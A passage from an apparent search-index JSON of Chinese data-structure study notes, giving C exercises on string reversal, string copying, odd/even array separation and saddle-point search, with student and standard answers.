= 0, j = n - 1, temp;\n    while (i &lt; j) {\n        if (i &lt; j &amp;&amp; A[i]&gt;0)\n            i++;\n        if (i &lt; j &amp;&amp; A[j] &lt; 0)\n            j--;\n        if (i &lt; j) {\n            temp = A[i];\n            A[i++] = A[j];\n            A[j--] = temp;\n        }\n    }\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E5%B9%BF%E4%B9%89%E8%A1%A8/#_30","title":"\u5b57\u7b26\u4e32\u9006\u7f6e","text":"<p>\u8bf7\u7f16\u5199\u4ee3\u7801\uff0c\u5b9e\u73b0\u5b57\u7b26\u4e32\u7684\u9006\u7f6e\u64cd\u4f5c\u3002<code>Char_Reverse</code>\u662f\u4e00\u4e2a\u9012\u5f52\u51fd\u6570\uff0c\u8be5\u51fd\u6570\u63a5\u53d7\u4e00\u4e2a\u5b57\u7b26\u6570\u7ec4\uff0c\u901a\u8fc7\u9012\u5f52\u65b9\u5f0f\u5b9e\u73b0\u5b57\u7b26\u4e32\u7684\u9006\u7f6e\uff0c\u5e76\u5c06\u9006\u7f6e\u540e\u7684\u5b57\u7b26\u4e32\u5b58\u50a8\u5728\u539f\u6570\u7ec4\u4e2d\u3002</p> <p>\u6ce8\u610f\uff1a\u9006\u7f6e\u7684\u5b57\u7b26\u4e32\u4ee5\u5b57\u7b26\u2019#'\u4f5c\u4e3a\u7ed3\u675f\u6807\u5fd7\u3002\u5b57\u7b26\u6570\u7ec4\u7684\u957f\u5ea6\u4e0d\u8d85\u8fc7\u9884\u5b9a\u4e49\u7684\u6700\u5927\u957f\u5ea6\u3002</p>"},{"location":"DEC/Data-Structure/Alpha-%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E5%B9%BF%E4%B9%89%E8%A1%A8/#_31","title":"\u793a\u4f8b","text":"<p>\u8f93\u5165</p> Text Only<pre><code>\u8bf7\u8f93\u5165\u4e00\u4e2a\u5b57\u7b26\u4e32\uff1aasdfg#\n</code></pre> <p>\u8f93\u51fa</p> Text Only<pre><code>\u5b57\u7b26\u4e32\u9006\u7f6e\u4e4b\u540e\u4e3a\uff1agfdsa\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E5%B9%BF%E4%B9%89%E8%A1%A8/#_32","title":"\u9898\u76ee","text":"C<pre><code>#include &lt;stdio.h&gt;\n#define MAXSIZE 100\n\nvoid Char_Reverse(char array[]){\n    //\u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n}\n\nint main(){\n    char array[MAXSIZE];\n    printf(\"\u8bf7\u8f93\u5165\u4e00\u4e2a\u5b57\u7b26\u4e32\uff08\u4ee5\u201c#\u201d\u7ed3\u675f\uff09\uff1a\");\n    Char_Reverse(array);\n    printf(\"\u5b57\u7b26\u4e32\u9006\u7f6e\u4e4b\u540e\u4e3a\uff1a%s\",array);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E5%B9%BF%E4%B9%89%E8%A1%A8/#_33","title":"\u7b54\u6848","text":"<p>\u9700\u8981\u6539\u4e00\u4e0b<code>main()</code>\uff0c\u8981\u4e0d\u7136\u771f\u7684\u4e0d\u77e5\u9053\u600e\u4e48\u9012\u5f52\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\n#define MAXSIZE 100\n\nvoid Char_Reverse(char array[], int start, int end) {\n    if (start &gt;= end) {\n        return;\n    }\n\n    // \u4ea4\u6362\u9996\u5c3e\u5b57\u7b26\n    char temp = array[start];\n    array[start] = array[end];\n    array[end] = temp;\n\n    // \u9012\u5f52\u5904\u7406\u5269\u4f59\u90e8\u5206\n    Char_Reverse(array, start + 1, end - 1);\n}\n\nint main() {\n    char array[MAXSIZE];\n    printf(\"\u8bf7\u8f93\u5165\u4e00\u4e2a\u5b57\u7b26\u4e32\uff08\u4ee5 '#' \u7ed3\u675f\uff09\uff1a\");\n    fgets(array, MAXSIZE, stdin);\n\n    // \u79fb\u9664\u6362\u884c\u7b26\n    array[strcspn(array, \"\\n\")] = '\\0';\n\n    // \u8ba1\u7b97\u5b57\u7b26\u4e32\u957f\u5ea6\n    int length = strlen(array);\n\n    // \u9006\u7f6e\u5b57\u7b26\u4e32\uff08\u4e0d\u5305\u62ec '#'\uff09\n    Char_Reverse(array, 0, length - 1);\n\n    printf(\"\u5b57\u7b26\u4e32\u9006\u7f6e\u4e4b\u540e\u4e3a\uff1a%s\\n\", array);\n    return 0;\n}\n</code></pre> <p>\u5173\u4e8e<code>strcspn()</code>\u51fd\u6570\uff1a</p> <p><code>strcspn</code> \u51fd\u6570\u662f C \u8bed\u8a00\u4e2d\u7684\u4e00\u4e2a\u5b57\u7b26\u4e32\u51fd\u6570\uff0c\u5176\u539f\u578b\u5b9a\u4e49\u5728 <code>&lt;string.h&gt;</code> \u5934\u6587\u4ef6\u4e2d\u3002</p> <p>\u51fd\u6570\u7b7e\u540d\u5982\u4e0b\uff1a</p> C<pre><code>size_t strcspn(const char *str1, const char *str2);\n</code></pre> <p>\u8be5\u51fd\u6570\u7528\u4e8e\u8ba1\u7b97\u5b57\u7b26\u4e32 <code>str1</code> \u5f00\u5934\u8fde\u7eed\u4e0d\u5305\u542b\u5b57\u7b26\u4e32 <code>str2</code> \u4e2d\u4efb\u4f55\u5b57\u7b26\u7684\u5b57\u7b26\u6570\uff0c\u4e5f\u5373\u8fd4\u56de <code>str1</code> \u4e2d\u7b2c\u4e00\u4e2a\u5339\u914d <code>str2</code> \u4e2d\u4efb\u4f55\u5b57\u7b26\u7684\u4f4d\u7f6e\u7684\u7d22\u5f15\u3002</p> <p>\u5177\u4f53\u6765\u8bf4\uff0c<code>strcspn</code> \u51fd\u6570\u4f1a\u4ece <code>str1</code> \u7684\u5f00\u5934\u5f00\u59cb\u9010\u4e2a\u5b57\u7b26\u6bd4\u8f83\uff0c\u76f4\u5230\u9047\u5230 <code>str2</code> \u4e2d\u7684\u4efb\u610f\u5b57\u7b26\uff0c\u6216\u8005\u5230\u8fbe <code>str1</code> \u7684\u7ed3\u5c3e\u4e3a\u6b62\u3002\u8fd4\u56de\u7684\u503c\u662f <code>str1</code> \u5f00\u5934\u8fde\u7eed\u4e0d\u5305\u542b <code>str2</code> \u4e2d\u4efb\u4f55\u5b57\u7b26\u7684\u5b57\u7b26\u6570\uff0c\u5373\u7b2c\u4e00\u4e2a\u5339\u914d\u7684\u5b57\u7b26\u5728 <code>str1</code> \u4e2d\u7684\u7d22\u5f15\u4f4d\u7f6e\u3002</p> <p>\u4e0b\u9762\u662f\u4e00\u4e2a\u793a\u4f8b\u6765\u8bf4\u660e <code>strcspn</code> \u51fd\u6570\u7684\u4f7f\u7528\uff1a</p> C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint main() {\n    char str1[] = \"Hello, World!\";\n    char str2[] = \"Wod\";\n\n    size_t index = strcspn(str1, str2);\n\n    printf(\"\u7b2c\u4e00\u4e2a\u5339\u914d\u5b57\u7b26\u7684\u7d22\u5f15\u4f4d\u7f6e\uff1a%zu\\n\", index);\n\n    return 0;\n}\n</code></pre> <p>\u8f93\u51fa\u7ed3\u679c\u4e3a\uff1a</p> Text Only<pre><code>\u7b2c\u4e00\u4e2a\u5339\u914d\u5b57\u7b26\u7684\u7d22\u5f15\u4f4d\u7f6e\uff1a6\n</code></pre> <p>\u5728\u4e0a\u9762\u7684\u793a\u4f8b\u4e2d\uff0c<code>str1</code> \u662f\u8981\u641c\u7d22\u7684\u5b57\u7b26\u4e32\uff0c<code>str2</code> \u662f\u8981\u5339\u914d\u7684\u5b57\u7b26\u96c6\u5408\u3002\u51fd\u6570\u8fd4\u56de\u7684\u662f <code>str1</code> \u4e2d\u7b2c\u4e00\u4e2a\u5339\u914d <code>str2</code> \u4e2d\u4efb\u4f55\u5b57\u7b26\u7684\u4f4d\u7f6e\u7684\u7d22\u5f15\u3002\u5728\u8fd9\u4e2a\u793a\u4f8b\u4e2d\uff0c\u5b57\u7b26 'W' \u5728 <code>str1</code> \u4e2d\u7684\u7d22\u5f15\u4f4d\u7f6e\u4e3a 6\u3002</p>"},{"location":"DEC/Data-Structure/Alpha-%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E5%B9%BF%E4%B9%89%E8%A1%A8/#_34","title":"\u6807\u51c6\u7b54\u6848\uff08\u8003\u8bd5\u7528\u8fd9\u4e2a\uff09","text":"<p>\u7528\u4e86<code>static</code>\u3002\u8fd9\u9012\u5f52\u8fd8\u662f\u5f88\u6709\u6c34\u5e73\u7684\u3002</p> C<pre><code>void Char_Reverse(char array[]) {\n    char str;\n    static int i = 0;//\u6570\u7ec4\u4e0b\u6807\n    scanf(\"%c\", &amp;str);\n    if (str != '#') {\n        Char_Reverse(array);\n        array[i++] = str;//\u5148\u5b58\u7684\u653e\u5230\u540e\u8fb9\n    }\n    array[i] = '\\0';\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E5%B9%BF%E4%B9%89%E8%A1%A8/#_35","title":"\u590d\u5236\u5b57\u7b26\u4e32","text":"<p>\u8bf7\u7f16\u5199\u4ee3\u7801\uff0c\u5b8c\u5584\u51fd\u6570<code>copy</code>\uff0c\u5b9e\u73b0\u5c06\u5b57\u7b26\u4e32 s2 \u7684\u5168\u90e8\u5b57\u7b26\u590d\u5236\u5230\u5b57\u7b26\u4e32 s1 \u4e2d\u3002\u8be5\u51fd\u6570\u63a5\u53d7\u4e24\u4e2a\u5b57\u7b26\u4e32\u53c2\u6570 s1 \u548c s2\uff0c\u5c06\u5b57\u7b26\u4e32 s2 \u7684\u5168\u90e8\u5b57\u7b26\u590d\u5236\u5230\u5b57\u7b26\u4e32 s1 \u4e2d\uff0c\u5e76\u8f93\u51fa\u590d\u5236\u540e\u7684\u5b57\u7b26\u4e32 s1\u3002</p> <p>\u6ce8\u610f\uff1a\u7981\u6b62\u4f7f\u7528strcpy\u51fd\u6570\u5b9e\u73b0\u590d\u5236\u5b57\u7b26\u4e32\u529f\u80fd\u3002</p>"},{"location":"DEC/Data-Structure/Alpha-%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E5%B9%BF%E4%B9%89%E8%A1%A8/#_36","title":"\u793a\u4f8b","text":"<p>\u8f93\u5165</p> Text Only<pre><code>\u8bf7\u8f93\u5165s1\u4e2d\u7684\u5b57\u7b26\u4e32\uff1a123\n\u8bf7\u8f93\u5165s2\u4e2d\u7684\u5b57\u7b26\u4e32\uff1aasd\n</code></pre> <p>\u8f93\u51fa</p> Text Only<pre><code>\u590d\u5236\u4e4b\u540e\u5b57\u7b26\u4e32s1\u4e3a\uff1aasd\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E5%B9%BF%E4%B9%89%E8%A1%A8/#_37","title":"\u9898\u76ee","text":"C<pre><code>#include &lt;stdio.h&gt;\n#define N 100 \n\nvoid copy(char s1[], char s2[]){\n    //\u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n\n} \n\nint main(){\n    char s1[N], s2[N];\n    printf(\"\u8bf7\u8f93\u5165s1\u4e2d\u7684\u5b57\u7b26\u4e32\uff1a\");\n    scanf(\"%s\", s1);\n    printf(\"\u8bf7\u8f93\u5165s2\u4e2d\u7684\u5b57\u7b26\u4e32\uff1a\");\n    scanf(\"%s\", s2);\n    copy(s1, s2);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E5%B9%BF%E4%B9%89%E8%A1%A8/#_38","title":"\u7b54\u6848","text":"C<pre><code>void copy(char s1[], char s2[]) {\n    int i = 0;\n\n    // \u590d\u5236\u5b57\u7b26\u4e32s2\u5230s1\n    while (s2[i] != '\\0') {\n        s1[i] = s2[i];\n        i++;\n    }\n\n    s1[i] = '\\0'; // \u6dfb\u52a0\u5b57\u7b26\u4e32\u7ed3\u675f\u7b26\n    printf(\"\u590d\u5236\u4e4b\u540e\u5b57\u7b26\u4e32s1\u4e3a\uff1a%s\\n\", s1);\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E5%B9%BF%E4%B9%89%E8%A1%A8/#_39","title":"\u6807\u51c6\u7b54\u6848","text":"C<pre><code>void copy(char s1[], char s2[]) {\n    int i;\n    for (i = 0; s2[i] != '\\0'; i++) {\n        s1[i] = s2[i];\n    }\n    s1[i] = '\\0';\n    printf(\"\u590d\u5236\u4e4b\u540e\u5b57\u7b26\u4e32s1\u4e3a\uff1a%s\\n\", s1);\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E5%B9%BF%E4%B9%89%E8%A1%A8/#_40","title":"\u5206\u79bb\u6570\u7ec4\u4e2d\u7684\u5947\u6570\u548c\u5076\u6570","text":"<p>\u5206\u79bb\u6570\u7ec4\u4e2d\u7684\u5947\u6570\u548c\u5076\u6570\uff0c\u5b58\u653e\u5728\u539f\u6570\u7ec4\u4e2d\u3002 \u8bf7\u7f16\u5199\u4ee3\u7801\uff0c\u5b8c\u5584\u51fd\u6570<code>Separate</code>\uff0c\u5b9e\u73b0\u5c06\u6570\u7ec4\u4e2d\u7684\u5947\u6570\u548c\u5076\u6570\u5206\u5f00\u7684\u64cd\u4f5c\u3002\u8be5\u51fd\u6570\u63a5\u53d7\u4e00\u4e2a\u6574\u6570\u6570\u7ec4 arr \u548c\u6570\u7ec4\u7684\u957f\u5ea6 length\uff0c\u5c06\u6570\u7ec4\u4e2d\u7684\u5947\u6570\u548c\u5076\u6570\u5206\u5f00\uff0c\u5e76\u6309\u7167\u5947\u6570\u5728\u524d\u3001\u5076\u6570\u5728\u540e\u7684\u987a\u5e8f\u91cd\u65b0\u6392\u5217\u6570\u7ec4\u3002</p>"},{"location":"DEC/Data-Structure/Alpha-%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E5%B9%BF%E4%B9%89%E8%A1%A8/#_41","title":"\u793a\u4f8b","text":"<p>\u8f93\u5165</p> Text Only<pre><code>main()\u51fd\u6570\u4e2d\u8bbe\u7f6earr[] = { 3, 2, 3, 4, 5, 9, 7, 8, 9 };\n</code></pre> <p>\u8f93\u51fa</p> Text Only<pre><code>\u53d8\u6362\u6b21\u5e8f\u540e\u7684\u6570\u7ec4\u4e3a\uff1a9 7 9 5 3 3 8 4 2\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E5%B9%BF%E4%B9%89%E8%A1%A8/#_42","title":"\u9898\u76ee","text":"C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n#define MAX 10\n\nvoid Separate(int arr[],int length){\n     //\u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n} \n\nint main(){\n     int arr[] = { 3, 2, 3, 4, 5, 9, 7, 8, 9 };\n     int length = sizeof(arr) / sizeof(arr[0]);//\u8ba1\u7b97\u6570\u7ec4\u7684\u957f\u5ea6 \n\n     // printf(\"\u53d8\u6362\u6b21\u5e8f\u540e\u7684\u6570\u7ec4\u4e3a\uff1a\");\n     Separate(arr,length);\n     for (int i = 0; i &lt; length; i++){\n         printf(\"%d \", arr[i]);//\u8f93\u51fa\u6570\u7ec4 \n     }\n     exit(0);//\u6267\u884c\u5b8c\u6b63\u5e38\u9000\u51fa \n     return 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E5%B9%BF%E4%B9%89%E8%A1%A8/#_43","title":"\u7b54\u6848","text":"<p>\u5148\u770b\u4e00\u6bb5\u9519\u8bef\u4ee3\u7801\uff0c\u7528\u7684\u65b9\u6cd5\u548c\u4e0a\u8fb9\u7684\u201c\u5c06\u6570\u7ec4\u4e2d\u7684\u6574\u6570\u6392\u5728\u8d1f\u6570\u524d\u9762\u201d\uff0c\u4e0d\u77e5\u9053\u4e3a\u4ec0\u4e48\u8fc7\u4e0d\u4e86\u68c0\u67e5\u3002\u95ee\u9898\u5728\u4e8e\u8f93\u51fa\u7684\u987a\u5e8f\uff08\u5b8c\u6210\u4e86\u5206\u79bb\u5947\u6570\u5076\u6570\uff0c\u4f46\u662f\u5947\u6570\u5076\u6570\u4e2d\u7684\u987a\u5e8f\u4e0d\u5bf9\uff09</p> C<pre><code>void Separate(int arr[], int length) {\n    int i = 0;\n    int j = length - 1;\n\n    while (i &lt; j) {\n        // \u4ece\u524d\u5f80\u540e\u627e\u5230\u7b2c\u4e00\u4e2a\u5076\u6570\n        while (i &lt; j &amp;&amp; arr[i] % 2 != 0) {\n            i++;\n        }\n\n        // \u4ece\u540e\u5f80\u524d\u627e\u5230\u7b2c\u4e00\u4e2a\u5947\u6570\n        while (i &lt; j &amp;&amp; arr[j] % 2 == 0) {\n            j--;\n        }\n\n        // \u4ea4\u6362\u5076\u6570\u548c\u5947\u6570\u7684\u4f4d\u7f6e\n        if (i &lt; j) {\n            int temp = arr[i];\n            arr[i] = arr[j];\n            arr[j] = temp;\n        }\n    }\n}\n</code></pre> <p>~~\u6b63\u786e\u7b54\u6848~~\uff08bushi</p> <p>\u80fd\u8fc7\u68c0\u67e5\u70b9\u7684\u7b54\u6848\u3002\uff08\u4e0d\u96be\u770b\u51fa\uff0c\u6211\u5bf9\u8fd9\u4e2a\u9898\u975e\u5e38\u65e0\u8bed\uff09</p> <p>\u8fd8\u662f\u770b\u5b98\u65b9\u7b54\u6848\u5427\uff0c\u4eba\u5bb6\u7684\u4ee3\u7801\u786e\u5b9e\u597d\uff01</p> C<pre><code>void Reverse(int arr[], int start, int end) {\n    while (start &lt; end) {\n        int temp = arr[start];\n        arr[start] = arr[end];\n        arr[end] = temp;\n        start++;\n        end--;\n    }\n}\n\nvoid Separate(int arr[], int length) {\n    int oddCount = 0; // \u5947\u6570\u8ba1\u6570\u5668\n\n    // \u7edf\u8ba1\u5947\u6570\u7684\u4e2a\u6570\n    for (int i = 0; i &lt; length; i++) {\n        if (arr[i] % 2 != 0) {\n            oddCount++;\n        }\n    }\n\n    // \u590d\u5236\u539f\u6570\u7ec4\u5230\u4e34\u65f6\u6570\u7ec4tmpArr\n    int* tmpArr = (int*)malloc(length * sizeof(int));\n    for (int i = 0; i &lt; length; i++) {\n        tmpArr[i] = arr[i];\n    }\n\n    int oddIndex = 0; // \u5947\u6570\u90e8\u5206\u7684\u7d22\u5f15\n    int evenIndex = oddCount; // \u5076\u6570\u90e8\u5206\u7684\u7d22\u5f15\n\n    // \u5c06\u5947\u6570\u548c\u5076\u6570\u5206\u522b\u653e\u7f6e\u5230\u5bf9\u5e94\u7684\u4f4d\u7f6e\n    for (int i = 0; i &lt; length; i++) {\n        if (tmpArr[i] % 2 != 0) {\n            arr[oddIndex++] = tmpArr[i];\n        }\n        else {\n            arr[evenIndex++] = tmpArr[i];\n        }\n    }\n\n    // \u5bf9\u5947\u6570\u90e8\u5206\u8fdb\u884c\u9006\u5e8f\n    Reverse(arr, 0, oddCount - 1);\n    // \u5bf9\u5076\u6570\u90e8\u5206\u8fdb\u884c\u9006\u5e8f\n    Reverse(arr, oddCount, length - 1);\n\n    free(tmpArr);\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E5%B9%BF%E4%B9%89%E8%A1%A8/#_44","title":"\u6807\u51c6\u7b54\u6848\uff08\u8003\u8bd5\u7528\u8fd9\u4e2a\uff09","text":"C<pre><code>void Separate(int originalArray[], int length) {\n    // \u5c06\u6570\u7ec4\u4e2d\u7684\u5947\u6570\u548c\u5076\u6570\u5206\u5f00\u5b58\u50a8\u5230\u4e24\u4e2a\u4e0d\u540c\u7684\u6570\u7ec4\u4e2d\n\n    int i = 0, oddIndex = 0, evenIndex = 0;\n    int odd[MAX] = { 0 }, even[MAX] = { 0 };\n\n    // \u904d\u5386\u539f\u59cb\u6570\u7ec4\n    while (i &lt; length) {\n        // \u5982\u679c\u5f53\u524d\u5143\u7d20\u4e3a\u5947\u6570\uff0c\u5b58\u50a8\u5230\u5947\u6570\u6570\u7ec4\u4e2d\n        if (originalArray[i] % 2 == 1) {\n            odd[oddIndex++] = originalArray[i++];\n        }\n        // \u5982\u679c\u5f53\u524d\u5143\u7d20\u4e3a\u5076\u6570\uff0c\u5b58\u50a8\u5230\u5076\u6570\u6570\u7ec4\u4e2d\n        else {\n            even[evenIndex++] = originalArray[i++];\n        }\n    }\n\n    // \u91cd\u7f6e\u5faa\u73af\u53d8\u91cf\u4ee5\u4fbf\u540e\u7eed\u904d\u5386\n    i = 0;\n    oddIndex--; // \u56e0\u4e3a\u4e4b\u540e\u7528\u4e0b\u6807\uff0c\u4ece0\u5f00\u59cb\n    evenIndex--;\n\n    // \u5c06\u5947\u6570\u6570\u7ec4\u4e2d\u7684\u5143\u7d20\u590d\u5236\u56de\u539f\u59cb\u6570\u7ec4\n    while (oddIndex != -1) {\n        originalArray[i++] = odd[oddIndex--];\n    }\n\n    // \u5c06\u5076\u6570\u6570\u7ec4\u4e2d\u7684\u5143\u7d20\u590d\u5236\u56de\u539f\u59cb\u6570\u7ec4\n    while (evenIndex != -1) {\n        originalArray[i++] = even[evenIndex--];\n    }\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E5%B9%BF%E4%B9%89%E8%A1%A8/#_45","title":"\u5224\u65ad\u4e09\u7ef4\u6570\u7ec4\u4e2d\u662f\u5426\u5b58\u5728\u978d\u70b9","text":"<p>\u5224\u65ad\u4e09\u7ef4\u6570\u7ec4\u4e2d\u662f\u5426\u5b58\u5728\u978d\u70b9\uff0c\u5982\u679c\u5b58\u5728\u5219\u8f93\u51fa\u3002\uff08\u978d\u70b9\uff1a\u4e00\u884c\u4e2d\u7684\u6700\u5927\u503c\uff0c\u5e76\u4e14\u4e5f\u662f\u4e00\u5217\u4e2d\u7684\u6700\u5c0f\u503c\uff09 \u8bf7\u7f16\u5199\u4ee3\u7801\uff0c\u5b8c\u5584\u51fd\u6570<code>Find</code>\uff0c\u5b9e\u73b0\u5728\u7ed9\u5b9a\u7684 3x3 \u6570\u7ec4\u4e2d\u627e\u5230\u978d\u70b9\u3002\u978d\u70b9\u662f\u6307\u5728\u6570\u7ec4\u4e2d\u7684\u67d0\u4e2a\u5143\u7d20\uff0c\u5b83\u5728\u6240\u5728\u884c\u4e0a\u662f\u6700\u5927\u503c\uff0c\u5728\u6240\u5728\u5217\u4e0a\u662f\u6700\u5c0f\u503c\u3002\u8be5\u51fd\u6570\u63a5\u53d7\u4e00\u4e2a\u4e8c\u7ef4\u6570\u7ec4 arr \u548c\u6570\u7ec4\u7684\u884c\u6570 row \u548c\u5217\u6570 col\uff0c\u67e5\u627e\u6570\u7ec4\u4e2d\u7684\u978d\u70b9\u3002</p>"},{"location":"DEC/Data-Structure/Alpha-%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E5%B9%BF%E4%B9%89%E8%A1%A8/#_46","title":"\u8981\u6c42","text":"Text Only<pre><code>1\u3001\u5982\u679c\u978d\u70b9\u4e0d\u5b58\u5728\uff0c\u5219\u8f93\u51fa \u201c\u8be5\u6570\u7ec4\u4e2d\u4e0d\u5b58\u5728\u978d\u70b9\uff01\u201d\u3002\uff08\u53cc\u5f15\u53f7\u4e2d\u7684\u5185\u5bb9\uff09\n2\u3001\u5982\u679c\u978d\u70b9\u5b58\u5728\uff0c\u5219\u8f93\u51fa \u201c\u8be5\u6570\u7ec4\u4e2d\u5b58\u5728\u978d\u70b9arr[%d][%d] = %d\u201d\u3002\uff08%d\u4ee3\u8868\u76f8\u5e94\u7684\u6570\u636e\uff09\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E5%B9%BF%E4%B9%89%E8%A1%A8/#_47","title":"\u793a\u4f8b","text":"<p>\u8f93\u5165</p> Text Only<pre><code>\u8bf7\u8f93\u5165\u6570\u7ec4\uff1a\n7 8 3\n5 7 5\n1 8 3\n</code></pre> <p>\u8f93\u51fa</p> Text Only<pre><code>\u8be5\u6570\u7ec4\u4e2d\u5b58\u5728\u978d\u70b9arr[1][1] = 7 \uff08\u7b2c2\u884c\u7b2c2\u5217\uff09\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E5%B9%BF%E4%B9%89%E8%A1%A8/#_48","title":"\u9898\u76ee","text":"C<pre><code>#define ROW 3\n#define COL 3       \n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid Find(int arr[][COL], int row, int col){\n     //\u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n}\n\nint main(){\n     int arr[ROW][COL] = { 0 };\n     Find(arr, ROW, COL);               \n     return 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E5%B9%BF%E4%B9%89%E8%A1%A8/#_49","title":"\u7b54\u6848","text":"<p>\u5b98\u65b9\u7b54\u6848\u662f\u628a\u54b1\u653e<code>main()</code>\u91cc\u9762\u7684\u4e1c\u897f\u653e\u5230\u4e86\u51fd\u6570\u91cc\u9762\u5b9e\u73b0\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n\n#define ROW 3\n#define COL 3                          \n\nvoid Find(int arr[][COL], int row, int col) {\n    int i, j;\n    int max_row, min_col;\n    int flag = 0; // \u6807\u8bb0\u662f\u5426\u627e\u5230\u4e86\u978d\u70b9\n\n    // \u904d\u5386\u6bcf\u4e00\u884c\n    for (i = 0; i &lt; row; i++) {\n        // \u627e\u5230\u5f53\u524d\u884c\u4e2d\u7684\u6700\u5927\u503c\n        max_row = arr[i][0];\n        for (j = 1; j &lt; col; j++) {\n            if (arr[i][j] &gt; max_row) {\n                max_row = arr[i][j];\n            }\n        }\n\n        for (j = 0; j &lt; col; j++) {\n            // \u627e\u5230\u5f53\u524d\u884c\u4e2d\u6700\u5927\u503c\u5bf9\u5e94\u7684\u5217\u7d22\u5f15\n            if (arr[i][j] == max_row) {\n\n                // \u68c0\u67e5\u8be5\u5217\u4e2d\u7684\u5143\u7d20\u662f\u5426\u662f\u6700\u5c0f\u503c\n                min_col = arr[0][j];\n                for (int k = 0; k &lt; row; k++) {\n                    if (arr[k][j] &lt; min_col) {\n                        min_col = arr[k][j];\n                    }\n                }\n\n                // \u5982\u679c\u5f53\u524d\u884c\u4e2d\u7684\u6700\u5927\u503c\u4e5f\u662f\u6240\u5728\u5217\u7684\u6700\u5c0f\u503c\uff0c\u5219\u627e\u5230\u4e86\u978d\u70b9\n                if (min_col == max_row) {\n                    printf(\"\u8be5\u6570\u7ec4\u4e2d\u5b58\u5728\u978d\u70b9arr[%d][%d] = %d\\n\", i, j, max_row);\n                    flag = 1;\n\n                    break; // \u4e0d\u518d\u7ee7\u7eed\u641c\u7d22\u8be5\u884c\n                }\n            }\n        }\n    }\n\n    // \u5982\u679c\u6ca1\u6709\u627e\u5230\u978d\u70b9\n    if (!flag) {\n        printf(\"\u8be5\u6570\u7ec4\u4e2d\u4e0d\u5b58\u5728\u978d\u70b9\uff01\\n\");\n    }\n}\n\nint main() {\n    int arr[ROW][COL] = { 0 };\n\n    printf(\"\u8bf7\u8f93\u5165\u6570\u7ec4\uff1a\\n\");\n    int i, j;\n    for (i = 0; i &lt; ROW; i++) {\n        for (j = 0; j &lt; COL; j++) {\n            scanf(\"%d\", &amp;arr[i][j]);\n        }\n    }\n\n    Find(arr, ROW, COL);\n    return 0;\n}\n</code></pre> <p>\u8fd8\u662f\u4e0aPOE\u5427\uff1a</p> <p>\u8fd9\u6bb5\u4ee3\u7801\u662f\u4e00\u4e2a\u5b8c\u6574\u7684\u7a0b\u5e8f\uff0c\u7528\u4e8e\u63a5\u6536\u7528\u6237\u8f93\u5165\u76843x3\u6574\u6570\u6570\u7ec4\uff0c\u5e76\u5224\u65ad\u662f\u5426\u5b58\u5728\u978d\u70b9\u3002</p> <p>\u9996\u5148\uff0c\u6211\u4eec\u5b9a\u4e49\u4e86\u5e38\u91cf<code>ROW</code>\u548c<code>COL</code>\uff0c\u5206\u522b\u8868\u793a\u6570\u7ec4\u7684\u884c\u6570\u548c\u5217\u6570\u3002\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u6211\u4eec\u5c06\u5176\u8bbe\u7f6e\u4e3a3\u3002</p> 